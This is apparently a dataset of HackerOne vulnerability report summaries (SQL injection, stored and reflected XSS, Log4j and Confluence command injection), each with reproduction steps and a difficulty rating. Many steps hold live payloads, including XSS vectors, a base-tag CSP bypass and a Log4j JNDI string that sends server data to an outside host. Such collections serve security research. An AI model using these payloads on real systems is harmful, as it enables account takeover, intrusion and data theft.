5. Replay the request in the same way as shown in #3, but with the body app_id='' (this time append -k -X POST --data "app_id=''" to the cURL command).
6. Notice in the response, there is an error: ORA-01722: invalid number.
7. Repeat step #3 as many times as you like. An odd number of apostrophes (') will cause the SQL query to fail because it is syntactically invalid, and an even number will cause it to fail because it is valid, but apostrophes are not numbers.
Exploitation Difficulty:
The vulnerability involves straightforward SQL injection techniques and does not require complex interactions or state manipulation. The discovery was facilitated by verbose error messages, making the vulnerability more apparent.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Stored Vulnerabilities (24 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1132202: Post-Auth Stored XSS with User Interaction leads to Remote Code Execution
================================================================================
Vulnerability Description:
The vulnerability involves a Stored XSS via unsafe usage of the toastr library combined with a validation bypass in the createRoom function. An attacker can create a room with an XSS payload in the name, which is then triggered when an admin edits the room's name. This can lead to Remote Code Execution by taking over the admin account and using admin privileges to execute arbitrary commands on the server.

Steps to Reproduce:
1. Set up an instance of RocketChat 3.12.1 using Docker Compose
2. Configure the instance with default settings and create a normal user (attacker)
3. Log in as the attacker user and execute the Meteor.call to create a channel with an XSS payload in the name
4. Invite the admin to the newly created channel
5. Log out and log in as an admin
6. Edit the title of the channel to trigger the XSS payload
7. Observe the XSS execution (e.g., alert showing the origin)
Exploitation Difficulty:
The attack involves multiple components (toastr library, createRoom function, room settings API) and requires understanding of how these components interact. The validation bypass in extraData and the unsafe handling of error messages are subtle and non-obvious. Additionally, the attack requires manipulating the application state (creating a room, inviting an admin, triggering the XSS) and involves novel logic in combining these components to achieve RCE.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1198517: Stored XSS in custom emoji
================================================================================
Vulnerability Description:
A stored Cross-Site Scripting (XSS) vulnerability exists in GitLab's custom emoji feature due to insufficient escaping of the `src` attribute in the `emoji_image_tag` function. This allows an attacker to inject malicious JavaScript code via a crafted emoji URL, which is executed when the emoji is rendered in the browser.

Steps to Reproduce:
1. Enable the custom emoji feature flag in a self-managed GitLab installation using the GitLab Rails console: `Feature.enable(:custom_emoji)`.
2. Create a custom emoji via GraphQL mutation with a malicious URL payload: `mutation { createCustomEmoji(input: { groupPath: "xss_target", name:"xssreplace", url:"http://aaa#'><img onerror=alert(location) src=.>" }) { customEmoji { id name url } } }`.
3. Use the custom emoji in a project file (e.g., README.md) with the syntax `:xssreplace:`.
4. View the rendered file in a browser to trigger the XSS payload.
Exploitation Difficulty:
The vulnerability involves enabling a feature flag, crafting a GraphQL mutation, and understanding the rendering context of custom emojis. While the steps are straightforward, the need to enable a feature flag and use GraphQL adds some complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1212067: Stored XSS in markdown via the DesignReferenceFilter 
================================================================================
Vulnerability Description:
A stored XSS vulnerability in GitLab's markdown rendering allows an attacker to inject arbitrary JavaScript via specially crafted design filenames. The vulnerability stems from improper escaping of filenames in design references, which can break out of HTML attributes and be combined with the ReferenceRedactor feature to inject malicious scripts, bypassing CSP protections.

Steps to Reproduce:
1. Create a new project on GitLab.com and a new issue.
2. Upload a design while modifying the Content-Disposition header to include a malicious filename with quotes.
3. Create a new issue using the design link with crafted markdown to inject attributes into the HTML link element.
4. Use the ReferenceRedactor feature to replace the node with arbitrary HTML via the data-original attribute.
5. Include a CSP bypass payload using a JSONP endpoint to execute arbitrary JavaScript.
Exploitation Difficulty:
This vulnerability requires deep understanding of multiple components: markdown parsing, design reference handling, HTML attribute injection, and CSP bypass techniques. The attacker must chain these components together in a non-obvious way, manipulating both file upload behavior and markdown rendering logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1379400: XSS in various MessageTypes
================================================================================
Vulnerability Description:
Rendering messages of various MessageTypes can lead to arbitrary script execution in the receiving frontend client. The vulnerability arises from unsanitized message parameters in certain MessageTypes, allowing authenticated adversaries to craft messages that exploit XSS in the displaying frontend clients.

Steps to Reproduce:
1. Login to Rocket.Chat
2. Find any Room ID (window URL path from direct messages or avatar image path from channels)
3. Call sendMessage Meteor Method with t parameter and the affected source parameter
Exploitation Difficulty:
The vulnerability involves understanding the MessageTypes rendering mechanism and identifying unsanitized parameters in specific MessageTypes. While the attack requires knowledge of the Rocket.Chat message system, the steps to exploit are straightforward once the vulnerable MessageTypes are identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1398305: Stored XSS on issue comments and other pages which contain notes
================================================================================
Vulnerability Description:
The vulnerability involves two XSS sanitization bypasses in GitLab: one through the SyntaxHighlightFilter which creates HTML from unsanitized data, and another through the gl-emoji custom element which bypasses the gitlab-ui v-safe-html directive sanitization. This allows an attacker to execute arbitrary JavaScript in the context of the victim's session.

Steps to Reproduce:
1. Launch a self-managed GitLab instance
2. Create an issue and paste the provided XSS payload into the comment field
3. Submit the comment and observe the XSS execution when the page is viewed
Exploitation Difficulty:
The attack requires understanding and combining two different sanitization bypass techniques, each involving different components of the GitLab application. The interaction between these components is non-obvious, and the payload construction is complex, requiring precise manipulation of HTML attributes and event handlers.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1436558: Universal XSS with Playlist feature
================================================================================
Vulnerability Description:
This vulnerability is a Universal XSS (Cross-Site Scripting) in Brave iOS, achieved by combining three weaknesses: exposure of UserScriptManager.securityToken, exposure of UserScriptManager.messageHandlerToken, and a UXSS in PlaylistHelper through nodeTag. The attack allows executing arbitrary JavaScript in the context of any domain visited by the user.

Steps to Reproduce:
1. Visit the Google page: https://sites.google.com/view/nishimunea-brave-uxss1/page which contains a cross-origin malicious page https://csrf.jp/brave/playlist.php in an iframe.
2. Push 'Add to Brave Playlist and Open' button in the setting menu.
3. Observe the alert dialog appearing on the sites.google.com domain.
Exploitation Difficulty:
The vulnerability involves multiple components (security token exposure, message handler token exposure, and UXSS via nodeTag), requires understanding subtle interactions between these components, and involves manipulating complex application states (Playlist feature, WebView mainframe execution). The novel logic of combining these weaknesses to achieve Universal XSS is not commonly found in other applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1481207: Stored XSS in Notes (with CSP bypass for gitlab.com)
================================================================================
Vulnerability Description:
This is a stored Cross-Site Scripting (XSS) vulnerability in GitLab's Markdown rendering, specifically in the syntax_highlight_filter.rb component. The vulnerability allows an attacker to inject a <base> tag, which redirects relative script loads to a malicious domain. By hosting crafted JavaScript files on this domain, the attacker can bypass Content Security Policy (CSP) protections and execute arbitrary code in the context of the GitLab.com domain.

Steps to Reproduce:
1. Log in as a user on Gitlab.com and go to any project (or create one), and add a new issue
2. Enter the following as the description (replace with your own server if needed):
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://joaxcar.com>
<pre x=&#34;">
<code></code></pre>
3. Save the issue and open DevTools (F12) to look for failing script imports
4. Create the missing script on your domain containing: alert(document.domain)
5. Reload the page to trigger the XSS popup
Exploitation Difficulty:
The attack involves multiple non-obvious components: exploiting HTML injection in Markdown, leveraging the <base> tag to bypass CSP, and understanding GitLab's script loading mechanism. The attacker must also identify and replicate the exact script paths expected by GitLab to successfully load malicious code. This requires deep understanding of both CSP bypass techniques and GitLab's internal architecture.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1731349: Stored XSS via Kroki diagram
================================================================================
Vulnerability Description:
The vulnerability is a stored XSS via Kroki diagram where arbitrary attributes can be injected into the resulting img tag due to improper handling of the lang attribute in the parent node. This allows for arbitrary JavaScript execution when a victim views a comment.

Steps to Reproduce:
1. Create an issue and use the following payload <a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
2. Reload/Visit the issue
Exploitation Difficulty:
The attack involves understanding the interaction between the parent and child nodes' lang attributes, crafting a payload that exploits this interaction, and bypassing CSP restrictions. The complexity arises from the need to understand the subtle interaction between the nodes and the CSP bypass technique.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2031855: XSS with Visual Language Editor tags
================================================================================
Vulnerability Description:
This is a stored XSS vulnerability in the Visual Language Editor (VLE) feature that allows an attacker to execute arbitrary JavaScript in the context of an administrator's session. The vulnerability occurs due to improper handling of VLE tags in the JavaScript code, where unescaped text is passed to jQuery's replaceWith function, allowing HTML injection.

Steps to Reproduce:
1. Create a post/comment/signature with the XSS payload using Visual Language Editor tags
2. Have an administrator with Quick Translating enabled visit the page containing the malicious content
Exploitation Difficulty:
The vulnerability requires understanding of multiple components: the VLE feature, its JavaScript implementation, and the admin interface's CSRF protection. The attacker must also know how to craft a payload that chains these components together (first obtaining a CSRF token, then making an admin request). The interaction between VLE tags and the unescaped jQuery replaceWith is subtle and not immediately obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2257080: Stored-XSS injected in Wiki page via Banzai pipeline
================================================================================
Vulnerability Description:
The vulnerability is a Stored-XSS with CSP-bypass in the AbstractReferenceFilter class, allowing attackers to inject arbitrary HTML elements and execute JavaScript in the context of the victim's session. This is achieved through a combination of HTML parsing inconsistencies, attribute manipulation, and mXSS (Mutation XSS) techniques.

Steps to Reproduce:
1. Create a new project and navigate to its Wikis section. Click 'Create your first page' button.
2. Fill the form with Title: '_sidear' and Content: 'please see in _sidebar.md attached file (_sidebar.md (F2868304))'. Click 'Create page' to save the wiki page.
3. After the page reloads, an alert will be displayed due to the injected JavaScript (alert(document.domain)).
Exploitation Difficulty:
This vulnerability involves multiple complex components: understanding the Banzai pipeline's HTML processing, exploiting gsub pattern matching quirks, manipulating HTML attribute encoding, leveraging mXSS through HTML4/HTML5 parsing differences, and bypassing CSP protections. The attack requires deep knowledge of GitLab's internal reference processing and careful construction of nested HTML elements with specific attribute manipulations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2521419: Stored XSS on trix editor version 2.1.1
================================================================================
Vulnerability Description:
The Trix editor version 2.1.1 is vulnerable to stored XSS when copying and pasting content from the web or other documents with markup. The improper sanitization of pasted content allows embedding malicious scripts that execute within the application's context.

Steps to Reproduce:
1. Load the HTML code in a browser with Trix editor version 2.1.1
2. Copy the text 'copy me' and paste it into the Trix editor to trigger the XSS payload
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of improper sanitization in a known editor. The attack is simple and does not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/309641: [simple-server] HTML with iframe element can be used as filename, which might lead to load and execute malicious JavaScript 
================================================================================
Vulnerability Description:
The vulnerability allows embedding HTML in file names served by simple-server, which can lead to the execution of malicious JavaScript when the directory listing is viewed. This occurs due to the lack of HTML sanitization in the outdated connect framework's directory middleware.

Steps to Reproduce:
1. Create a file with the name: "><iframe src="malware_frame.html"> in the directory served by simple-server
2. Create a malware_frame.html file in the same directory with malicious JavaScript content
3. Run simple-server in the directory containing the malicious files
4. Access the server via browser to trigger the execution of the malicious JavaScript
Exploitation Difficulty:
The attack involves creating a specially crafted filename and a corresponding HTML file, but the interaction between these components is straightforward and the vulnerability stems from a known issue in outdated middleware. The steps to reproduce are clear and do not require complex application state manipulation or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/309648: [simplehttpserver] Stored XSS in file names leads to malicious JavaScript code execution when directory listing is output in HTML
================================================================================
Vulnerability Description:
The vulnerability is a stored Cross-Site Scripting (XSS) in the simplehttpserver module, where file names are directly embedded into HTML without sanitization. This allows an attacker to execute arbitrary JavaScript code when a user clicks on a maliciously named file in the directory listing.

Steps to Reproduce:
1. Create a file with a name containing malicious JavaScript code (e.g., 'javascript:alert("You are pwned!")' in the directory served by simplehttpserver.
2. Run simplehttpserver in the directory and access the served page via a browser. Clicking the malicious file name will execute the JavaScript code.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS pattern where user input (file names) is directly embedded into HTML without sanitization. The attack does not require complex interactions or understanding of multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/311101: [crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server
================================================================================
Vulnerability Description:
The crud-file-server package is vulnerable to stored XSS via filenames due to lack of HTML sanitization when displaying directory listings. Malicious JavaScript can be executed by creating files with specially crafted names containing HTML/JS payloads.

Steps to Reproduce:
1. Install crud-file-server using npm: `npm install crud-file-server`
2. Create a file with a malicious filename in the served directory: `"><iframe src="malware_frame.html">`
3. Create a second file named `malware_frame.html` with malicious JavaScript content
4. Run the crud-file-server in the directory containing the malicious files: `./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080`
5. Access the server via browser at `http://127.0.0.1:8080` to trigger the XSS
Exploitation Difficulty:
The vulnerability is straightforward to discover as it follows common XSS patterns in file listing scenarios. The attack requires only basic knowledge of XSS payloads and observing unsanitized output in directory listings.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/394016: Web Cache Deception Attack (XSS)
================================================================================
Vulnerability Description:
The vulnerability is a Web Cache Deception attack leading to XSS via the X-Forwarded-Host header. The application improperly includes the header value in a font URL without proper sanitization, allowing script injection. The response is then cached, serving the malicious payload to other users.

Steps to Reproduce:
1. Send a crafted HTTP request with a malicious X-Forwarded-Host header to a vulnerable Discourse instance, e.g., GET /?xx HTTP/1.1 Host: meta.discourse.org X-Forwarded-Host: cacheattack'"<script>alert(document.domain)</script>
2. The response will include the malicious script in the font URL parameter, which will be cached for 1 minute. Any user accessing the same URL with matching headers will receive the cached XSS payload.
Exploitation Difficulty:
The attack requires understanding of HTTP header manipulation, cache behavior, and XSS injection points. While the components are standard web security concepts, the interaction between cache poisoning and XSS via font URLs is non-obvious and requires specific knowledge of Discourse's implementation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/507159: [fileview] Inadequate Output Encoding and Escaping 
================================================================================
Vulnerability Description:
The fileview module suffers from a stored XSS vulnerability due to inadequate output encoding and escaping of filenames. An attacker can embed malicious JavaScript code in a filename, which gets executed when a victim browses the file via the web interface.

Steps to Reproduce:
1. Install fileview: npm install fileview -g
2. Create a file with XSS payload: "><img src=x onerror=alert("xss")>.jpg
3. Start the file server: fileview -p /root/ -P 8080
4. Access http://127.0.0.1:8080/ to observe XSS execution
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS attack vector (filename manipulation) and does not require complex interactions or state manipulations. The attack is simple and follows a predictable pattern of testing for lack of input sanitization.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/507303: [file-browser] Inadequate Output Encoding and Escaping 
================================================================================
Vulnerability Description:
The file-browser module suffers from a stored XSS vulnerability due to improper output encoding and escaping. An attacker can embed malicious JavaScript code in filenames, which gets executed when the file is browsed via the web interface.

Steps to Reproduce:
1. Install file-browser globally: `npm -g install file-browser`
2. Start the file server: `file-browser`
3. Create a file with an XSS payload as the filename: `touch '"><img src=x onerror=alert("xss")>.jpg'`
4. Access the file server URL in a browser: `http://127.0.0.1:8088/lib/template.html`
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS pattern (filename manipulation) in a simple file server application. The attack does not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/508184: Persistent XSS in Note objects
================================================================================
Vulnerability Description:
This is a persistent XSS vulnerability in GitLab's Note objects where an attacker can inject malicious scripts through manipulated project imports. The vulnerability arises from improper cache invalidation and project import logic, allowing the attacker to bypass markdown regeneration checks and execute arbitrary JavaScript in the context of the victim's session.

Steps to Reproduce:
1. Create an export of a project with at least 1 discussion in at least 1 merge request.
2. Modify the project.json file to include XSS payload in note_html and set cached_markdown_version to 917504.
3. Import the modified project into GitLab.
4. View the discussion in the imported project to trigger the XSS payload.
Exploitation Difficulty:
The vulnerability involves understanding and manipulating multiple components: the Note object's attributes, cache invalidation logic, and markdown version checks. The attacker needs to identify the specific conditions under which the markdown regeneration is skipped (note_html and cached_markdown_version manipulation) and the fixed version number (917504) that bypasses the check. This requires deep knowledge of GitLab's internal workings and non-obvious interactions between these components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/509930: Potential unprivileged Stored XSS through wp_targeted_link_rel
================================================================================
Vulnerability Description:
The vulnerability is a Stored XSS via attribute injection in the `wp_targeted_link_rel()` function in WordPress. This function improperly handles the `rel` attribute in anchor tags, allowing an attacker to inject malicious attributes that can execute arbitrary JavaScript when processed. The issue arises because the function does not properly account for the position of the `rel` attribute within other quoted attributes, leading to attribute escaping and injection.

Steps to Reproduce:
1. Log in as an administrator and enable the display of user bio in BuddyPress settings (Appearance -> Customize -> BuddyPress Nouveau -> Member front page).
2. Create a normal forum user account, log in, and edit the profile to insert the XSS payload: `<a href="#" title=" target='abc' rel= onmouseover=alert(/XSS/) ">This is a PoC for a Stored XSS</a>` as the user description.
3. Visit the user profile page and hover over the link to trigger the XSS.
Exploitation Difficulty:
The vulnerability involves understanding the interaction between the `wp_targeted_link_rel()` function and how it processes HTML attributes, particularly the `rel` attribute within quoted attributes. The attacker must craft a payload that exploits the function's regex parsing to inject malicious attributes. This requires knowledge of HTML attribute parsing and the specific behavior of the WordPress function.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/633231: pre-auth Stored XSS in comments via javascript: url when administrator edits user supplied comment
================================================================================
Vulnerability Description:
A pre-auth stored XSS vulnerability exists in the comments section when an administrator edits a user-supplied comment containing a malicious JavaScript URL. The vulnerability arises due to the improper handling of escaped characters in the URL by the `shortcode_parse_atts()` function, which allows bypassing the `esc_url()` function.

Steps to Reproduce:
1. As an unauthenticated user, create a comment with the following content: 'Hi! I really enjoy your work. We've also written a blog post about it here: http://dummysite.com/awesome-blogpost. Feel free to check it out! <a href="javascript\x3aalert(1);">Visit my web page</a>'
2. Create a second comment requesting an admin to edit the first comment. Log in as an admin, edit the first comment, and save it. View the comment on the post and click the 'Visit my web page' URL to trigger the XSS.
Exploitation Difficulty:
The vulnerability requires understanding the interaction between the `wp_rel_nofollow_callback()` function, `shortcode_parse_atts()`, and the `esc_url()` function. The attacker must also know how to craft a payload that bypasses URL filtering by using escaped characters. Additionally, the attack requires an admin to edit the comment, adding a layer of complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/836649: Stored XSS in markdown when redacting references
================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the markdown rendering when redacting references. The vulnerability allows injecting arbitrary HTML via the data-original attribute, which is not properly sanitized when the reference is redacted. This can be exploited to execute JavaScript in the context of the victim's session.

Steps to Reproduce:
1. Create a private project with one account and create an issue in it.
2. Sign into another account that does not have permission to read the private project and post a link to the issue with malicious HTML in the data-original attribute.
Exploitation Difficulty:
The vulnerability requires understanding the markdown rendering process, the reference redaction mechanism, and how to craft a payload that bypasses CSP. The interaction between the data-original attribute and the redaction logic is subtle and not immediately obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/899954: XSS in message attachment fileds.
================================================================================
Vulnerability Description:
A Cross-Site Scripting (XSS) vulnerability exists in Rocket.Chat's message attachment fields where HTML input is rendered verbatim without sanitization, allowing execution of arbitrary JavaScript in the context of other users' sessions.

Steps to Reproduce:
1. Obtain a Personal Access Token from Rocket.Chat
2. Create a channel named '#cookies' and invite administrators
3. Use curl to send a malicious message with HTML payload in the attachment field
4. Execute XSS payload when administrators view the message
Exploitation Difficulty:
The vulnerability requires understanding of Rocket.Chat's attachment rendering mechanism and API usage, but the core XSS technique is straightforward once these components are identified. The attack doesn't involve complex state manipulation or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/950190: Store-XSS in error message of build-dependencies 
================================================================================
Vulnerability Description:
A stored-XSS vulnerability exists in the error message of build-dependencies in GitLab's self-managed installations. The vulnerability allows an attacker to inject malicious JavaScript via a crafted job name in the .gitlab-ci.yml file, which is then executed when viewing the job details.

Steps to Reproduce:
1. Create an empty project in a self-managed GitLab installation
2. Go to 'Settings/CI/CD/Runners' to setup a runner for this project
3. Create a new file .gitlab-ci.yml with the provided malicious content
4. Wait for the jobs to terminate and go to the detail of job-test
5. Observe the alert containing the current URL, indicating the XSS execution
Exploitation Difficulty:
The attack involves crafting a specific .gitlab-ci.yml file with a malicious job name and understanding how GitLab processes dependencies and displays error messages. However, the steps are straightforward once the vulnerability vector is known, and the interaction between components is not particularly subtle or complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/977697: Stored-XSS in merge requests
================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the merge requests pages where the source_branch parameter is not sanitized when used as a title attribute, allowing an attacker to execute arbitrary JavaScript code in the context of the victim's session.

Steps to Reproduce:
1. Create a new project with the option 'Initialize repository with a README' or use an existing project.
2. Create a new branch with a name containing an XSS payload, e.g., '><iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>'.
3. Create a new merge request from the new branch to master.
4. Open the merge request to trigger the XSS payload.
Exploitation Difficulty:
The vulnerability involves a straightforward injection of an XSS payload into a branch name, which is then reflected in the merge request page without proper sanitization. The attack does not require complex interactions or deep understanding of the application's state.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - DOM Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1212822: Stored XSS in Mermaid when viewing Markdown files
================================================================================
Vulnerability Description:
A stored XSS vulnerability in GitLab's Mermaid integration allows HTML injection through malformed flowchart configuration directives, combined with a CSP bypass using pipeline artifacts to achieve RCE by exfiltrating CSRF tokens.

Steps to Reproduce:
1. Create a repository on GitLab.com and add a malicious .gitlab-ci.yml file that generates an exploit.js artifact
2. Add a README.md with a Mermaid diagram directive that injects an iframe loading the exploit.js artifact via GitLab's API
Exploitation Difficulty:
This vulnerability requires deep understanding of multiple complex systems: Mermaid's configuration directives and sanitization logic, GitLab's artifact handling and CSP policies, and the interaction between these components. The attacker must recognize that setting htmlLabels to string 'false' bypasses sanitization while still rendering HTML, and must devise the artifact-based CSP bypass mechanism.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Reflected Vulnerabilities (5 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1216203: Mattermost Server OAuth Flow Cross-Site Scripting
================================================================================
Vulnerability Description:
The vulnerability is a reflected Cross-Site Scripting (XSS) via the OAuth flow in Mattermost Server. A victim clicking a malicious link pointing to the target Mattermost host will trigger the XSS. If the victim is a regular user, it is possible to obtain all of their Mattermost chat contents; if it’s an administrator, it is possible to create a new administrator. The root cause is the application's failure to sanitize the 'redirect_to' HTTP query parameter before reflecting it within the HTML response during the OAuth flow.

Steps to Reproduce:
1. Visit the following URL after replacing <mattermost_url> with the domain/ip of the mattermost server instance: https://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror=%22alert(%27zi0Black%20@%20Shielder%27)%22%3E
2. Notice the JavaScript's generated pop-up
Exploitation Difficulty:
The vulnerability involves a straightforward reflected XSS attack where the 'redirect_to' parameter is directly injected into the HTML response without sanitization. The attack does not require complex interactions between components or manipulation of application states. The discovery process mainly involves identifying the unsanitized parameter and crafting a simple XSS payload.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1638984: fix(cmd-socketio-server): mitigate cross site scripting attack #2068
================================================================================
Vulnerability Description:
The vulnerability is a cross-site scripting (XSS) attack in the cmd-socketio-server, where user input is not properly sanitized, allowing an attacker to inject malicious JavaScript code that can be executed in the context of other users' sessions.

Steps to Reproduce:
1. Identify a vulnerable endpoint in the cmd-socketio-server that does not properly sanitize user input.
2. Craft a malicious payload containing JavaScript code and submit it to the vulnerable endpoint.
Exploitation Difficulty:
The vulnerability involves a single component (the cmd-socketio-server) and a well-known attack vector (XSS). The discovery requires basic understanding of XSS and testing for input sanitization, which is a common practice in security testing.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/232320: [doc.rt.informaticacloud.com] Reflected XSS via Stack Strace
================================================================================
Vulnerability Description:
The vulnerability is a reflected Cross-Site Scripting (XSS) via the stack trace error message. The application reflects user input in the error response without proper sanitization, allowing JavaScript execution in the context of the victim's browser session.

Steps to Reproduce:
1. Navigate to the URL: http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/nav/7_1_2_3_2_1<svg/onload=alert(document.domain)>
2. Observe the reflected XSS in the error response, which includes the injected JavaScript code in the stack trace
Exploitation Difficulty:
The attack is straightforward, involving only a single component (URL parameter injection) with no complex interactions or state manipulation required. The vulnerability is discovered through basic input fuzzing techniques.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/317125: [bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template
================================================================================
Vulnerability Description:
The bracket-template module is vulnerable to Reflected XSS when variables passed via GET parameters are used directly in templates without proper sanitization. This allows an attacker to inject arbitrary JavaScript code that executes in the context of the victim's browser.

Steps to Reproduce:
1. Install the bracket-template module: npm install bracket-template
2. Create a sample application that reads a name from the URL and displays a welcome message without sanitizing the input
3. Run the application: node app.js
4. Access the application in a browser with a malicious payload in the URL parameter, e.g., http://localhost:8080?name=bl4de\x3cscript\x3econsole.log(\x22XSS\x22)\x3c/script\x3e
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS pattern where unsanitized user input is directly embedded into the template. The attack does not require complex interactions or state manipulation, and the payload is a standard XSS vector.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/946728: SafeParamsHelper::safe_params is not so safe
================================================================================
Vulnerability Description:
The SafeParamsHelper.safe_params method in GitLab fails to filter out all dangerous reserved options, leading to multiple vulnerabilities including open redirects, reflected XSS via javascript protocol, and CSP bypass through blob viewer manipulation.

Steps to Reproduce:
1. Visit https://gitlab.com/vakzz-h1/Redirect1?domain=aw.rs to trigger an open redirect to https://aw.rs/
2. Visit https://gitlab.com/vakzz-h1/redirect1/-/issues?script_name=javascript:alert(1)// to trigger a reflected XSS via the javascript protocol
Exploitation Difficulty:
The vulnerability requires understanding of Rails URL generation parameters and their security implications, but the attack vectors are straightforward once these parameters are known. The main complexity comes from recognizing the impact of unfiltered parameters across different contexts (redirects, XSS, CSP bypass).

--------------------------------------------------------------------------------



OS Command Injection Vulnerabilities (24 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1327701: RCE on ███████ [CVE-2021-26084]
================================================================================
Vulnerability Description:
An OGNL injection vulnerability in Confluence Server and Data Center allows authenticated or unauthenticated users (if signup is enabled) to execute arbitrary code via crafted requests to vulnerable endpoints.

Steps to Reproduce:
1. Send a POST request to the vulnerable endpoint /pages/createpage-entervariables.action?SpaceKey=x with a crafted queryString parameter containing OGNL injection payload.
2. The payload executes arbitrary code (e.g., cat /etc/passwd) on the server, and the response includes the command output.
Exploitation Difficulty:
The attack involves crafting a complex OGNL injection payload and understanding the vulnerable endpoint. While the payload is intricate, the vulnerability itself is a known OGNL injection pattern, and the endpoint is straightforward to target once identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1327769: RCE in ███ [CVE-2021-26084]
================================================================================
Vulnerability Description:
An OGNL injection vulnerability in Confluence Server and Data Center allows authenticated or unauthenticated users (if user signup is enabled) to execute arbitrary code on the server. The vulnerability stems from improper input validation in the `queryString` parameter of the `/pages/doenterpagevariables.action` endpoint.

Steps to Reproduce:
1. Send a POST request to the vulnerable endpoint `/confluence/pages/doenterpagevariables.action` with a crafted queryString parameter containing OGNL injection payload.
2. The payload executes arbitrary code (e.g., `cat /etc/passwd`) on the server, returning sensitive system information in the response.
Exploitation Difficulty:
While the vulnerability involves OGNL injection, which requires some knowledge of Java and Confluence's internals, the attack itself is straightforward once the vulnerable endpoint and payload structure are known. The payload construction is complex but follows predictable patterns for OGNL injection attacks.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1425563: Remote code injection in Log4j on http://mtn1app.mtncameroon.net  - CVE-2021-44228
================================================================================
Vulnerability Description:
This is a remote code injection vulnerability in Log4j (CVE-2021-44228) affecting the specified MTN Cameroon application. The vulnerability allows for remote command execution via a crafted JNDI lookup, as demonstrated by retrieving the hostname of the machine.

Steps to Reproduce:
1. Run the nuclei script targeting the vulnerable URL: ./nuclei -u http://mtn1app.mtncameroon.net:8080/ -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml
2. Observe the output which includes the hostname of the machine, confirming the vulnerability.
Exploitation Difficulty:
The vulnerability was discovered using a publicly available nuclei script, which automates the detection of this well-known Log4j vulnerability. The attack involves a straightforward injection without requiring complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1425565: Remote code injection in Log4j on  https://mymtn.mtncongo.net - CVE-2021-44228
================================================================================
Vulnerability Description:
This vulnerability is a remote code injection in Log4j (CVE-2021-44228) that allows for remote command execution. The tester used a nuclei script to exploit this vulnerability and retrieve the hostname of the target machine.

Steps to Reproduce:
1. Run the nuclei script with the following command: ./nuclei -u https://mymtn.mtncongo.net:8443 -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml
2. Observe the output, which will include the hostname of the machine if the vulnerability is present.
Exploitation Difficulty:
The vulnerability was discovered using a publicly available script (nuclei-templates) that automates the detection of this specific CVE. The attack does not require multiple components, complex interactions, or novel logic; it is a straightforward exploitation of a known vulnerability.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1430622: [forum.acronis.com] JNDI Code Injection due an outdated log4j component
================================================================================
Vulnerability Description:
The vulnerability is a JNDI code injection due to an outdated log4j component (CVE-2021-44228), allowing authenticated users to perform remote code execution via JNDI exfiltration. The attack exploits the log4j library's handling of crafted input strings, leading to command execution on the server.

Steps to Reproduce:
1. Identify the vulnerable endpoint: https://forum.acronis.com/search?s=${j${main:\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-04363f1f3427b48.test3.ggdd.co.uk/}
2. Trigger the JNDI injection by sending a crafted request to the endpoint, which exfiltrates system information to a controlled server (ggdd.co.uk)
Exploitation Difficulty:
The vulnerability is straightforward to exploit once the outdated log4j component is identified. The attack involves a single, well-documented exploit (CVE-2021-44228) without requiring complex interactions or state manipulation. The steps are clear and do not involve novel or subtle logic.

--------------------------------------------------------------------------------

